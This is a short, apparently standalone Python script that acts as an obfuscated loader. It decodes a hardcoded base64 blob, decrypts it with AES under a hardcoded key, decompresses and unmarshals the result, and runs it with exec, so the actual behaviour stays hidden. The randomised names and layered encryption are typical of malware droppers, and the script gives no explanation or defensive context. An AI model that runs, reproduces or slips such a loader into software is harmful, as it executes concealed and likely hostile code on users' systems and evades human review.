
import base64, zlib, marshal
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

OjaJclgNtf = b'TZeglyqUXvlFldbs'

fiYBUHlr = "UCAFXm3kdhQSNIgC26uyY2jEsaLQB4jYYHKVsrdhAZ5VGEV60mC0mbVOQeCa32pRMTXdm1TLVqu363jg1ZXrfQtP3e8hOx0RiY2qLmwWuSuxRYhd9o52gPlqol3pLbIcyAjRtMhoacWMaCAIpJbBYLruFvaXAz/326ix+cYbnrk4BCILVVxpX7X2IN3V8At3pk3wha6bRTLqAa/CpBng7LgYGuFw0ndFu3ivTkD8p0U="
cKCiIRpK = base64.b64decode(fiYBUHlr)

qgMcymdp = AES.new(OjaJclgNtf, AES.MODE_ECB)
lXaaMbdo = unpad(qgMcymdp.decrypt(cKCiIRpK), AES.block_size)

exec(marshal.loads(zlib.decompress(lXaaMbdo)))
